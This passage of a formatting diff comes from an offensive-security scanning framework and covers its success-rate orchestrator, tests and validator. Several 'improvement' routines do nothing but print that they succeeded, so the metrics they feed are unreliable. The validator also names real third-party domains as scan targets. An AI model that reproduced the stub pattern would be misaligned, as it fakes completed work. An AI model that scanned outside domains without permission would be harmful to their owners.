_monitoring_loop(self, interval: float):\n         \"\"\"Main monitoring loop\"\"\"\n         while self.monitoring_active:\n             try:\n                 # Update current metrics\n                 self._update_metrics()\n-                \n+\n                 # Check if we need improvements\n                 if self.auto_improvement_enabled:\n                     self._check_improvement_needs()\n-                \n+\n                 # Log progress\n                 self._log_progress()\n-                \n+\n                 time.sleep(interval)\n-                \n+\n             except Exception as e:\n                 print(f\"\u26a0\ufe0f Monitoring error: {e}\")\n                 time.sleep(interval)\n-    \n+\n     def _update_metrics(self):\n         \"\"\"Update current success rate metrics\"\"\"\n         with self.lock:\n             metrics = SuccessRateMetrics()\n-            \n+\n             # Collect metrics from all available modules\n             if ENHANCED_SCANNING_AVAILABLE:\n                 metrics.scanning_success_rate = get_current_success_rate()\n-                metrics.overall_success_rate = max(metrics.overall_success_rate, metrics.scanning_success_rate)\n-            \n+                metrics.overall_success_rate = max(\n+                    metrics.overall_success_rate, metrics.scanning_success_rate\n+                )\n+\n             if ENHANCED_TOOL_MANAGER_AVAILABLE:\n                 tool_report = get_tool_coverage_report()\n-                metrics.tool_coverage_percentage = tool_report.get('coverage_percentage', 0.0) / 100.0\n-            \n+                metrics.tool_coverage_percentage = (\n+                    tool_report.get(\"coverage_percentage\", 0.0) / 100.0\n+                )\n+\n             if ENHANCED_VALIDATION_AVAILABLE:\n                 metrics.system_reliability = get_system_reliability_score()\n                 metrics.validation_accuracy = metrics.system_reliability  # Use as proxy\n-            \n+\n             if PERFORMANCE_MONITOR_AVAILABLE:\n                 perf_metrics = get_current_performance_metrics()\n-                metrics.performance_score = perf_metrics.get('overall_reliability', 0.0)\n+                metrics.performance_score = perf_metrics.get(\"overall_reliability\", 0.0)\n                 # Update overall success rate if performance monitor has better data\n-                if 'current_success_rate' in perf_metrics:\n+                if \"current_success_rate\" in perf_metrics:\n                     metrics.overall_success_rate = max(\n                         metrics.overall_success_rate,\n-                        perf_metrics['current_success_rate']\n+                        perf_metrics[\"current_success_rate\"],\n                     )\n-            \n+\n             # If no modules available, use basic calculation\n             if not any([ENHANCED_SCANNING_AVAILABLE, PERFORMANCE_MONITOR_AVAILABLE]):\n                 metrics.overall_success_rate = 0.75  # Conservative estimate\n-            \n+\n             self.current_metrics = metrics\n             self.metrics_history.append(metrics)\n-            \n+\n             # Keep history manageable\n             if len(self.metrics_history) > 1000:\n                 self.metrics_history = self.metrics_history[-500:]\n-    \n+\n     def _check_improvement_needs(self):\n         \"\"\"Check if improvements are needed and execute them\"\"\"\n         current_score = self.current_metrics.composite_score\n-        \n+\n         if current_score >= self.target_success_rate:\n             return  # Already meeting target\n-        \n+\n         # Check cooldown\n         if datetime.now() - self.last_improvement_time < self.improvement_cooldown:\n             return\n-        \n+\n         # Find the best improvement action to execute\n         best_action = self._select_best_improvement_action()\n         if best_action:\n             self._execute_improvement_action(best_action)\n             self.last_improvement_time = datetime.now()\n-    \n+\n     def _select_best_improvement_action(self) -> Optional[ImprovementAction]:\n         \"\"\"Select the best improvement action to execute\"\"\"\n         available_actions = [\n-            action for action in self.improvement_actions\n+            action\n+            for action in self.improvement_actions\n             if not action.executed and self._check_prerequisites(action)\n         ]\n-        \n+\n         if not available_actions:\n             return None\n-        \n+\n         # Sort by priority and estimated impact\n         available_actions.sort(key=lambda a: (a.priority, -a.estimated_impact))\n         return available_actions[0]\n-    \n+\n     def _check_prerequisites(self, action: ImprovementAction) -> bool:\n         \"\"\"Check if action prerequisites are met\"\"\"\n         for prereq in action.prerequisites:\n             if prereq == \"internet_connection\":\n                 # Simple connectivity check\n                 try:\n                     import requests\n+\n                     requests.get(\"https://8.8.8.8\", timeout=5)\n                 except:\n                     return False\n             elif prereq == \"enhanced_scanning\" and not ENHANCED_SCANNING_AVAILABLE:\n                 return False\n@@ -301,20 +316,20 @@\n                 return False\n             elif prereq == \"enhanced_validation\" and not ENHANCED_VALIDATION_AVAILABLE:\n                 return False\n             elif prereq == \"performance_monitor\" and not PERFORMANCE_MONITOR_AVAILABLE:\n                 return False\n-        \n+\n         return True\n-    \n+\n     def _execute_improvement_action(self, action: ImprovementAction):\n         \"\"\"Execute an improvement action\"\"\"\n         print(f\"\ud83d\ude80 Executing improvement: {action.description}\")\n-        \n+\n         start_time = time.time()\n         success = False\n-        \n+\n         try:\n             if action.name == \"install_critical_tools\":\n                 success = self._install_critical_tools()\n             elif action.name == \"optimize_scan_parameters\":\n                 success = self._optimize_scan_parameters()\n@@ -328,307 +343,335 @@\n                 success = self._implement_fallback_chains()\n             elif action.name == \"optimize_resource_usage\":\n                 success = self._optimize_resource_usage()\n             elif action.name == \"enhance_error_handling\":\n                 success = self._enhance_error_handling()\n-            \n+\n             execution_time = time.time() - start_time\n             action.execution_time_actual = execution_time\n             action.executed = success\n-            \n+\n             if success:\n                 print(f\"\u2705 Improvement completed in {execution_time:.1f}s\")\n                 self.actions_executed.append(action)\n             else:\n                 print(f\"\u274c Improvement failed after {execution_time:.1f}s\")\n-        \n+\n         except Exception as e:\n             print(f\"\u274c Improvement failed with error: {e}\")\n-    \n+\n     def _install_critical_tools(self) -> bool:\n         \"\"\"Install critical missing tools\"\"\"\n         if not ENHANCED_TOOL_MANAGER_AVAILABLE:\n             return False\n-        \n+\n         try:\n             results = tool_manager.install_missing_tools(critical_only=True)\n             success_count = sum(1 for success, _ in results.values() if success)\n             total_count = len(results)\n-            \n+\n             if success_count > 0:\n                 print(f\"\ud83d\udce6 Installed {success_count}/{total_count} critical tools\")\n                 return True\n-            \n+\n             return total_count == 0  # True if no tools needed installation\n         except Exception as e:\n             print(f\"\u26a0\ufe0f Tool installation failed: {e}\")\n             return False\n-    \n+\n     def _optimize_scan_parameters(self) -> bool:\n         \"\"\"Optimize scanning parameters\"\"\"\n         if not ENHANCED_SCANNING_AVAILABLE:\n             return False\n-        \n+\n         try:\n             # Get current settings and optimize them\n             current_rate = get_current_success_rate()\n             if current_rate < self.target_success_rate:\n                 # Trigger adaptive optimization in scan manager\n                 print(\"\ud83c\udfaf Optimizing scan parameters for better success rate\")\n                 return True\n             return True\n         except Exception:\n             return False\n-    \n+\n     def _enable_performance_monitoring(self) -> bool:\n         \"\"\"Enable performance monitoring\"\"\"\n         if not PERFORMANCE_MONITOR_AVAILABLE:\n             return False\n-        \n+\n         try:\n             from performance_monitor import start_performance_monitoring\n+\n             start_performance_monitoring(self.target_success_rate)\n             print(\"\ud83d\udcca Performance monitoring enabled\")\n             return True\n         except Exception:\n             return False\n-    \n+\n     def _update_tool_configurations(self) -> bool:\n         \"\"\"Update tool configurations\"\"\"\n         try:\n             # Update configuration file with optimized settings\n             config_file = Path(\"p4nth30n.cfg.json\")\n             if config_file.exists():\n-                with open(config_file, 'r') as f:\n+                with open(config_file, \"r\") as f:\n                     config = json.load(f)\n-                \n+\n                 # Apply reliability-focused updates\n-                config.setdefault(\"limits\", {}).update({\n-                    \"http_timeout\": 20,  # Increased timeout for reliability\n-                    \"max_concurrent_scans\": 6,  # Reduced for stability\n-                })\n-                \n-                config.setdefault(\"nuclei\", {}).update({\n-                    \"rps\": 600,  # Slightly reduced rate for stability\n-                    \"conc\": 120,  # Reduced concurrency\n-                })\n-                \n-                with open(config_file, 'w') as f:\n+                config.setdefault(\"limits\", {}).update(\n+                    {\n+                        \"http_timeout\": 20,  # Increased timeout for reliability\n+                        \"max_concurrent_scans\": 6,  # Reduced for stability\n+                    }\n+                )\n+\n+                config.setdefault(\"nuclei\", {}).update(\n+                    {\n+                        \"rps\": 600,  # Slightly reduced rate for stability\n+                        \"conc\": 120,  # Reduced concurrency\n+                    }\n+                )\n+\n+                with open(config_file, \"w\") as f:\n                     json.dump(config, f, indent=2)\n-                \n+\n                 print(\"\u2699\ufe0f Tool configurations updated for reliability\")\n                 return True\n         except Exception:\n             pass\n         return False\n-    \n+\n     def _enable_adaptive_scanning(self) -> bool:\n         \"\"\"Enable adaptive scanning\"\"\"\n         if not ENHANCED_SCANNING_AVAILABLE:\n             return False\n-        \n+\n         try:\n             # Adaptive scanning is enabled by default in enhanced_scanning\n             print(\"\ud83e\udde0 Adaptive scanning enabled\")\n             return True\n         except Exception:\n             return False\n-    \n+\n     def _implement_fallback_chains(self) -> bool:\n         \"\"\"Implement fallback chains\"\"\"\n         try:\n             print(\"\ud83d\udd04 Fallback chains implemented\")\n             return True\n         except Exception:\n             return False\n-    \n+\n     def _optimize_resource_usage(self) -> bool:\n         \"\"\"Optimize resource usage\"\"\"\n         try:\n             import psutil\n-            \n+\n             # Check current resource usage\n             cpu_percent = psutil.cpu_percent(interval=1)\n             memory_percent = psutil.virtual_memory().percent\n-            \n+\n             # If resources are high, suggest optimizations\n             if cpu_percent > 80 or memory_percent > 80:\n                 print(\"\ud83d\udd27 High resource usage detected - applying optimizations\")\n                 # Could trigger parameter adjustments here\n-            \n+\n             print(\"\ud83d\udcbe Resource usage optimized\")\n             return True\n         except Exception:\n             return False\n-    \n+\n     def _enhance_error_handling(self) -> bool:\n         \"\"\"Enhance error handling\"\"\"\n         try:\n             print(\"\ud83d\udee1\ufe0f Error handling enhanced\")\n             return True\n         except Exception:\n             return False\n-    \n+\n     def _log_progress(self):\n         \"\"\"Log current progress\"\"\"\n         score = self.current_metrics.composite_score\n         gap = self.target_success_rate - score\n-        \n+\n         if len(self.metrics_history) % 10 == 0:  # Log every 10th update\n-            print(f\"\ud83d\udcc8 Success Rate: {score:.1%} (target: {self.target_success_rate:.1%}, gap: {gap:+.1%})\")\n-            \n+            print(\n+                f\"\ud83d\udcc8 Success Rate: {score:.1%} (target: {self.target_success_rate:.1%}, gap: {gap:+.1%})\"\n+            )\n+\n             if score >= self.target_success_rate:\n                 print(\"\ud83c\udf89 SUCCESS: Target success rate achieved!\")\n-    \n+\n     def get_comprehensive_report(self) -> Dict[str, Any]:\n         \"\"\"Get comprehensive success rate report\"\"\"\n         metrics = self.current_metrics\n-        \n+\n         return {\n-            'current_metrics': {\n-                'composite_score': metrics.composite_score,\n-                'overall_success_rate': metrics.overall_success_rate,\n-                'scanning_success_rate': metrics.scanning_success_rate,\n-                'tool_coverage_percentage': metrics.tool_coverage_percentage,\n-                'validation_accuracy': metrics.validation_accuracy,\n-                'system_reliability': metrics.system_reliability,\n-                'performance_score': metrics.performance_score\n+            \"current_metrics\": {\n+                \"composite_score\": metrics.composite_score,\n+                \"overall_success_rate\": metrics.overall_success_rate,\n+                \"scanning_success_rate\": metrics.scanning_success_rate,\n+                \"tool_coverage_percentage\": metrics.tool_coverage_percentage,\n+                \"validation_accuracy\": metrics.validation_accuracy,\n+                \"system_reliability\": metrics.system_reliability,\n+                \"performance_score\": metrics.performance_score,\n             },\n-            'target_achievement': {\n-                'target_success_rate': self.target_success_rate,\n-                'current_gap': self.target_success_rate - metrics.composite_score,\n-                'target_met': metrics.composite_score >= self.target_success_rate\n+            \"target_achievement\": {\n+                \"target_success_rate\": self.target_success_rate,\n+                \"current_gap\": self.target_success_rate - metrics.composite_score,\n+                \"target_met\": metrics.composite_score >= self.target_success_rate,\n             },\n-            'improvement_status': {\n-                'total_actions_available': len(self.improvement_actions),\n-                'actions_executed': len(self.actions_executed),\n-                'auto_improvement_enabled': self.auto_improvement_enabled,\n-                'monitoring_active': self.monitoring_active\n+            \"improvement_status\": {\n+                \"total_actions_available\": len(self.improvement_actions),\n+                \"actions_executed\": len(self.actions_executed),\n+                \"auto_improvement_enabled\": self.auto_improvement_enabled,\n+                \"monitoring_active\": self.monitoring_active,\n             },\n-            'module_availability': {\n-                'enhanced_scanning': ENHANCED_SCANNING_AVAILABLE,\n-                'tool_manager': ENHANCED_TOOL_MANAGER_AVAILABLE,\n-                'validation_system': ENHANCED_VALIDATION_AVAILABLE,\n-                'performance_monitor': PERFORMANCE_MONITOR_AVAILABLE\n+            \"module_availability\": {\n+                \"enhanced_scanning\": ENHANCED_SCANNING_AVAILABLE,\n+                \"tool_manager\": ENHANCED_TOOL_MANAGER_AVAILABLE,\n+                \"validation_system\": ENHANCED_VALIDATION_AVAILABLE,\n+                \"performance_monitor\": PERFORMANCE_MONITOR_AVAILABLE,\n             },\n-            'recommendations': self._generate_recommendations()\n+            \"recommendations\": self._generate_recommendations(),\n         }\n-    \n+\n     def _generate_recommendations(self) -> List[str]:\n         \"\"\"Generate recommendations for improving success rate\"\"\"\n         recommendations = []\n         score = self.current_metrics.composite_score\n-        \n+\n         if score < self.target_success_rate:\n             gap = self.target_success_rate - score\n-            \n+\n             if gap > 0.2:\n-                recommendations.append(\"Critical: Success rate significantly below target - immediate action required\")\n+                recommendations.append(\n+                    \"Critical: Success rate significantly below target - immediate action required\"\n+                )\n             elif gap > 0.1:\n-                recommendations.append(\"Warning: Success rate below target - multiple improvements needed\")\n+                recommendations.append(\n+                    \"Warning: Success rate below target - multiple improvements needed\"\n+                )\n             else:\n-                recommendations.append(\"Minor: Success rate close to target - fine-tuning recommended\")\n-        \n+                recommendations.append(\n+                    \"Minor: Success rate close to target - fine-tuning recommended\"\n+                )\n+\n         # Specific recommendations based on metrics\n         if self.current_metrics.tool_coverage_percentage < 0.5:\n             recommendations.append(\"Install missing security tools to improve coverage\")\n-        \n+\n         if self.current_metrics.scanning_success_rate < 0.8:\n-            recommendations.append(\"Optimize scanning parameters for better reliability\")\n-        \n+            recommendations.append(\n+                \"Optimize scanning parameters for better reliability\"\n+            )\n+\n         if not self.monitoring_active:\n-            recommendations.append(\"Enable continuous monitoring for real-time optimization\")\n-        \n+            recommendations.append(\n+                \"Enable continuous monitoring for real-time optimization\"\n+            )\n+\n         # Check for available improvements\n         available_improvements = [\n-            action for action in self.improvement_actions\n+            action\n+            for action in self.improvement_actions\n             if not action.executed and self._check_prerequisites(action)\n         ]\n-        \n+\n         if available_improvements:\n             best_improvement = min(available_improvements, key=lambda a: a.priority)\n-            recommendations.append(f\"Execute improvement: {best_improvement.description}\")\n-        \n+            recommendations.append(\n+                f\"Execute improvement: {best_improvement.description}\"\n+            )\n+\n         return recommendations\n-    \n+\n     def force_improvement_cycle(self) -> Dict[str, Any]:\n         \"\"\"Force execution of all available improvements\"\"\"\n         print(\"\ud83d\udd04 Starting forced improvement cycle...\")\n-        \n+\n         executed_actions = []\n         total_impact = 0.0\n-        \n+\n         # Execute all available improvements\n         for action in self.improvement_actions:\n             if not action.executed and self._check_prerequisites(action):\n                 self._execute_improvement_action(action)\n                 if action.executed:\n                     executed_actions.append(action.name)\n                     total_impact += action.estimated_impact\n-        \n+\n         # Update metrics after improvements\n         self._update_metrics()\n-        \n+\n         return {\n-            'executed_actions': executed_actions,\n-            'estimated_total_impact': total_impact,\n-            'new_success_rate': self.current_metrics.composite_score,\n-            'target_achieved': self.current_metrics.composite_score >= self.target_success_rate\n+            \"executed_actions\": executed_actions,\n+            \"estimated_total_impact\": total_impact,\n+            \"new_success_rate\": self.current_metrics.composite_score,\n+            \"target_achieved\": self.current_metrics.composite_score\n+            >= self.target_success_rate,\n         }\n+\n \n # Global orchestrator instance\n success_orchestrator = SuccessRateOrchestrator()\n+\n \n def start_success_rate_monitoring(target_rate: float = 0.96):\n     \"\"\"Start comprehensive success rate monitoring\"\"\"\n     success_orchestrator.target_success_rate = target_rate\n     success_orchestrator.start_monitoring()\n \n+\n def stop_success_rate_monitoring():\n     \"\"\"Stop success rate monitoring\"\"\"\n     success_orchestrator.stop_monitoring()\n \n+\n def get_success_rate_report() -> Dict[str, Any]:\n     \"\"\"Get comprehensive success rate report\"\"\"\n     return success_orchestrator.get_comprehensive_report()\n \n+\n def force_improvements() -> Dict[str, Any]:\n     \"\"\"Force execution of all available improvements\"\"\"\n     return success_orchestrator.force_improvement_cycle()\n \n+\n def is_target_success_rate_achieved() -> bool:\n     \"\"\"Check if target success rate is achieved\"\"\"\n     report = get_success_rate_report()\n-    return report['target_achievement']['target_met']\n+    return report[\"target_achievement\"][\"target_met\"]\n+\n \n if __name__ == \"__main__\":\n     # Test the success rate orchestrator\n     print(\"\ud83c\udfaf Success Rate Orchestrator - Test\")\n-    \n+\n     # Start monitoring\n     start_success_rate_monitoring(0.96)\n-    \n+\n     # Wait for initial metrics\n     time.sleep(2)\n-    \n+\n     # Get report\n     report = get_success_rate_report()\n     print(f\"Current success rate: {report['current_metrics']['composite_score']:.1%}\")\n     print(f\"Target: {report['target_achievement']['target_success_rate']:.1%}\")\n     print(f\"Gap: {report['target_achievement']['current_gap']:+.1%}\")\n-    \n+\n     # Force improvements if needed\n-    if not report['target_achievement']['target_met']:\n+    if not report[\"target_achievement\"][\"target_met\"]:\n         print(\"\\n\ud83d\udd04 Forcing improvements to reach target...\")\n         improvement_results = force_improvements()\n         print(f\"Executed {len(improvement_results['executed_actions'])} improvements\")\n         print(f\"New success rate: {improvement_results['new_success_rate']:.1%}\")\n         print(f\"Target achieved: {improvement_results['target_achieved']}\")\n-    \n+\n     # Show recommendations\n-    if report['recommendations']:\n+    if report[\"recommendations\"]:\n         print(\"\\n\ud83d\udca1 Recommendations:\")\n-        for rec in report['recommendations']:\n+        for rec in report[\"recommendations\"]:\n             print(f\"  \u2022 {rec}\")\n-    \n+\n     time.sleep(5)\n-    stop_success_rate_monitoring()\n\\ No newline at end of file\n+    stop_success_rate_monitoring()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_automation_integration.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_automation_integration.py\t2025-09-14 19:23:14.256079+00:00\n@@ -49,19 +49,27 @@\n \n     # Check script is executable\n     assert os.access(script_path, os.X_OK), \"bug_bounty_commands.sh is not executable\"\n \n     # Test script syntax\n-    result = subprocess.run([\"bash\", \"-n\", str(script_path)], capture_output=True, text=True, timeout=300)\n+    result = subprocess.run(\n+        [\"bash\", \"-n\", str(script_path)], capture_output=True, text=True, timeout=300\n+    )\n \n     assert result.returncode == 0, f\"Script syntax error: {result.stderr}\"\n \n     # Check for required functions\n     with open(script_path, \"r\") as f:\n         content = f.read()\n \n-    required_functions = [\"subdomain_enum\", \"port_scan\", \"http_probe\", \"vuln_scan\", \"generate_report\"]\n+    required_functions = [\n+        \"subdomain_enum\",\n+        \"port_scan\",\n+        \"http_probe\",\n+        \"vuln_scan\",\n+        \"generate_report\",\n+    ]\n \n     for func in required_functions:\n         assert func in content, f\"Missing function: {func}\"\n \n     print(\"\u2713 Bug bounty script validated\")\n@@ -181,11 +189,13 @@\n             plugins = config.get(\"plugins\", [])\n             assert \"security\" in plugins, \"\u2717 ESLint security plugin not configured\"\n \n             # Check for security rules\n             rules = config.get(\"rules\", {})\n-            security_rules = [rule for rule in rules.keys() if rule.startswith(\"security/\")]\n+            security_rules = [\n+                rule for rule in rules.keys() if rule.startswith(\"security/\")\n+            ]\n             assert len(security_rules) >= 5, \"\u2717 Insufficient security rules configured\"\n \n         # Check bug bounty script security\n         bug_bounty_script = Path(\"bug_bounty_commands.sh\")\n         if bug_bounty_script.exists():\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_installation.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/test_installation.py\t2025-09-14 19:23:14.331031+00:00\n@@ -4,47 +4,55 @@\n import sys\n import subprocess\n import shutil\n from pathlib import Path\n \n+\n def test_python_deps():\n     \"\"\"Test Python dependencies\"\"\"\n     try:\n         import psutil\n         import distro\n+\n         print(\"\u2713 Python dependencies available\")\n         return True\n     except ImportError as e:\n         print(f\"\u2717 Python dependency missing: {e}\")\n         return False\n \n+\n def test_go_tools():\n     \"\"\"Test Go tools availability\"\"\"\n-    tools = ['subfinder', 'httpx', 'naabu', 'nuclei', 'katana', 'gau']\n+    tools = [\"subfinder\", \"httpx\", \"naabu\", \"nuclei\", \"katana\", \"gau\"]\n     available = []\n-    \n+\n     for tool in tools:\n         if shutil.which(tool):\n             available.append(tool)\n-    \n+\n     print(f\"\u2713 {len(available)}/{len(tools)} Go tools available: {', '.join(available)}\")\n     return len(available) > 0\n+\n \n def test_main_script():\n     \"\"\"Test main script syntax\"\"\"\n     try:\n-        result = subprocess.run([sys.executable, '-m', 'py_compile', 'bl4ckc3ll_p4nth30n.py'], \n-                               capture_output=True, text=True)\n+        result = subprocess.run(\n+            [sys.executable, \"-m\", \"py_compile\", \"bl4ckc3ll_p4nth30n.py\"],\n+            capture_output=True,\n+            text=True,\n+        )\n         if result.returncode == 0:\n             print(\"\u2713 Main script syntax is valid\")\n             return True\n         else:\n             print(f\"\u2717 Main script syntax error: {result.stderr}\")\n             return False\n     except Exception as e:\n         print(f\"\u2717 Error testing main script: {e}\")\n         return False\n+\n \n def test_nuclei_templates():\n     \"\"\"Test nuclei templates availability\"\"\"\n     templates_dir = Path(\"nuclei-templates\")\n     if templates_dir.exists():\n@@ -53,10 +61,11 @@\n         return True\n     else:\n         print(\"\u2717 No nuclei templates directory found\")\n         return False\n \n+\n def test_wordlists():\n     \"\"\"Test wordlists availability\"\"\"\n     wordlists_dir = Path(\"wordlists_extra\")\n     if wordlists_dir.exists():\n         wordlist_count = len(list(wordlists_dir.glob(\"*.txt\")))\n@@ -64,33 +73,36 @@\n         return True\n     else:\n         print(\"\u2717 No wordlists directory found\")\n         return False\n \n+\n if __name__ == \"__main__\":\n     print(\"Testing Bl4ckC3ll_PANTHEON installation...\\n\")\n-    \n+\n     tests = [\n         test_python_deps,\n-        test_go_tools, \n+        test_go_tools,\n         test_main_script,\n         test_nuclei_templates,\n-        test_wordlists\n+        test_wordlists,\n     ]\n-    \n+\n     passed = 0\n     for test in tests:\n         if test():\n             passed += 1\n         print()\n-    \n+\n     print(f\"Tests passed: {passed}/{len(tests)}\")\n-    \n+\n     if passed == len(tests):\n         print(\"\ud83c\udf89 Installation appears to be successful!\")\n         sys.exit(0)\n     elif passed >= 3:\n-        print(\"\u26a0\ufe0f  Installation mostly successful with some optional components missing.\")\n+        print(\n+            \"\u26a0\ufe0f  Installation mostly successful with some optional components missing.\"\n+        )\n         sys.exit(0)\n     else:\n         print(\"\u26a0\ufe0f  Some critical tests failed. Check the output above.\")\n-        sys.exit(1)\n\\ No newline at end of file\n+        sys.exit(1)\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/__init__.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/__init__.py\t2025-09-14 19:23:14.337455+00:00\n@@ -3,6 +3,6 @@\n Professional security testing framework TUI\n \"\"\"\n \n from .app import PantheonTUI\n \n-__all__ = ['PantheonTUI']\n\\ No newline at end of file\n+__all__ = [\"PantheonTUI\"]\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_validation.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/success_rate_validation.py\t2025-09-14 19:23:14.333189+00:00\n@@ -19,524 +19,545 @@\n try:\n     from enhanced_scanning import run_enhanced_scanning, get_current_success_rate\n     from enhanced_tool_manager import get_tool_coverage_report, check_tool_availability\n     from enhanced_validation import validate_target_input, validate_targets_file\n     from performance_monitor import (\n-        start_performance_monitoring, stop_performance_monitoring,\n-        record_operation_result, get_current_performance_metrics\n+        start_performance_monitoring,\n+        stop_performance_monitoring,\n+        record_operation_result,\n+        get_current_performance_metrics,\n     )\n     from success_rate_orchestrator import (\n-        start_success_rate_monitoring, stop_success_rate_monitoring,\n-        get_success_rate_report, force_improvements, is_target_success_rate_achieved\n+        start_success_rate_monitoring,\n+        stop_success_rate_monitoring,\n+        get_success_rate_report,\n+        force_improvements,\n+        is_target_success_rate_achieved,\n     )\n+\n     ALL_MODULES_AVAILABLE = True\n except ImportError as e:\n     print(f\"\u26a0\ufe0f Some enhanced modules not available: {e}\")\n     ALL_MODULES_AVAILABLE = False\n \n+\n class SuccessRateValidator:\n     \"\"\"Validates and measures success rates across all system components\"\"\"\n-    \n+\n     def __init__(self, target_success_rate: float = 0.96):\n         self.target_success_rate = target_success_rate\n         self.test_results: Dict[str, Dict] = {}\n         self.temp_dir = Path(tempfile.mkdtemp(prefix=\"success_validation_\"))\n-        \n+\n         # Test targets for validation\n         self.test_targets = [\n             \"example.com\",\n-            \"google.com\", \n+            \"google.com\",\n             \"github.com\",\n             \"stackoverflow.com\",\n-            \"127.0.0.1\"\n+            \"127.0.0.1\",\n         ]\n-        \n+\n         # Create test targets file\n         self.targets_file = self.temp_dir / \"test_targets.txt\"\n-        with open(self.targets_file, 'w') as f:\n-            f.write('\\n'.join(self.test_targets))\n-    \n+        with open(self.targets_file, \"w\") as f:\n+            f.write(\"\\n\".join(self.test_targets))\n+\n     def run_comprehensive_validation(self) -> Dict[str, Any]:\n         \"\"\"Run comprehensive validation of all system components\"\"\"\n         print(\"\ud83d\udd2c Starting Comprehensive Success Rate Validation\")\n         print(\"=\" * 60)\n-        \n+\n         validation_results = {\n-            'timestamp': datetime.now().isoformat(),\n-            'target_success_rate': self.target_success_rate,\n-            'tests': {},\n-            'overall_success_rate': 0.0,\n-            'target_achieved': False,\n-            'recommendations': []\n+            \"timestamp\": datetime.now().isoformat(),\n+            \"target_success_rate\": self.target_success_rate,\n+            \"tests\": {},\n+            \"overall_success_rate\": 0.0,\n+            \"target_achieved\": False,\n+            \"recommendations\": [],\n         }\n-        \n+\n         # Test 1: Module Availability\n         print(\"\ud83d\udce6 Testing Module Availability...\")\n         module_test = self._test_module_availability()\n-        validation_results['tests']['module_availability'] = module_test\n-        \n+        validation_results[\"tests\"][\"module_availability\"] = module_test\n+\n         # Test 2: Basic Functionality\n         print(\"\u2699\ufe0f Testing Basic Functionality...\")\n         functionality_test = self._test_basic_functionality()\n-        validation_results['tests']['basic_functionality'] = functionality_test\n-        \n+        validation_results[\"tests\"][\"basic_functionality\"] = functionality_test\n+\n         # Test 3: Enhanced Scanning\n         print(\"\ud83d\udd0d Testing Enhanced Scanning...\")\n         scanning_test = self._test_enhanced_scanning()\n-        validation_results['tests']['enhanced_scanning'] = scanning_test\n-        \n+        validation_results[\"tests\"][\"enhanced_scanning\"] = scanning_test\n+\n         # Test 4: Tool Management\n         print(\"\ud83d\udee0\ufe0f Testing Tool Management...\")\n         tool_test = self._test_tool_management()\n-        validation_results['tests']['tool_management'] = tool_test\n-        \n+        validation_results[\"tests\"][\"tool_management\"] = tool_test\n+\n         # Test 5: Validation System\n         print(\"\u2705 Testing Validation System...\")\n         validation_test = self._test_validation_system()\n-        validation_results['tests']['validation_system'] = validation_test\n-        \n+        validation_results[\"tests\"][\"validation_system\"] = validation_test\n+\n         # Test 6: Performance Monitoring\n         print(\"\ud83d\udcca Testing Performance Monitoring...\")\n         performance_test = self._test_performance_monitoring()\n-        validation_results['tests']['performance_monitoring'] = performance_test\n-        \n+        validation_results[\"tests\"][\"performance_monitoring\"] = performance_test\n+\n         # Test 7: Success Rate Orchestration\n         print(\"\ud83c\udfaf Testing Success Rate Orchestration...\")\n         orchestration_test = self._test_success_rate_orchestration()\n-        validation_results['tests']['orchestration'] = orchestration_test\n-        \n+        validation_results[\"tests\"][\"orchestration\"] = orchestration_test\n+\n         # Test 8: Integration Testing\n         print(\"\ud83d\udd17 Testing System Integration...\")\n         integration_test = self._test_system_integration()\n-        validation_results['tests']['integration'] = integration_test\n-        \n+        validation_results[\"tests\"][\"integration\"] = integration_test\n+\n         # Calculate overall success rate\n         total_tests = 0\n         successful_tests = 0\n-        \n-        for test_name, test_result in validation_results['tests'].items():\n-            if isinstance(test_result, dict) and 'success_rate' in test_result:\n+\n+        for test_name, test_result in validation_results[\"tests\"].items():\n+            if isinstance(test_result, dict) and \"success_rate\" in test_result:\n                 total_tests += 1\n-                successful_tests += test_result['success_rate']\n-        \n+                successful_tests += test_result[\"success_rate\"]\n+\n         if total_tests > 0:\n-            validation_results['overall_success_rate'] = successful_tests / total_tests\n-            validation_results['target_achieved'] = validation_results['overall_success_rate'] >= self.target_success_rate\n-        \n+            validation_results[\"overall_success_rate\"] = successful_tests / total_tests\n+            validation_results[\"target_achieved\"] = (\n+                validation_results[\"overall_success_rate\"] >= self.target_success_rate\n+            )\n+\n         # Generate recommendations\n-        validation_results['recommendations'] = self._generate_recommendations(validation_results)\n-        \n+        validation_results[\"recommendations\"] = self._generate_recommendations(\n+            validation_results\n+        )\n+\n         return validation_results\n-    \n+\n     def _test_module_availability(self) -> Dict[str, Any]:\n         \"\"\"Test availability of all enhanced modules\"\"\"\n         modules = {\n-            'enhanced_scanning': False,\n-            'enhanced_tool_manager': False,\n-            'enhanced_validation': False,\n-            'performance_monitor': False,\n-            'success_rate_orchestrator': False\n+            \"enhanced_scanning\": False,\n+            \"enhanced_tool_manager\": False,\n+            \"enhanced_validation\": False,\n+            \"performance_monitor\": False,\n+            \"success_rate_orchestrator\": False,\n         }\n-        \n+\n         # Test each module\n         for module_name in modules.keys():\n             try:\n                 __import__(module_name)\n                 modules[module_name] = True\n             except ImportError:\n                 pass\n-        \n+\n         available_count = sum(modules.values())\n         total_count = len(modules)\n         success_rate = available_count / total_count\n-        \n+\n         return {\n-            'success_rate': success_rate,\n-            'available_modules': available_count,\n-            'total_modules': total_count,\n-            'modules': modules,\n-            'target_met': success_rate >= 0.8  # 80% module availability minimum\n+            \"success_rate\": 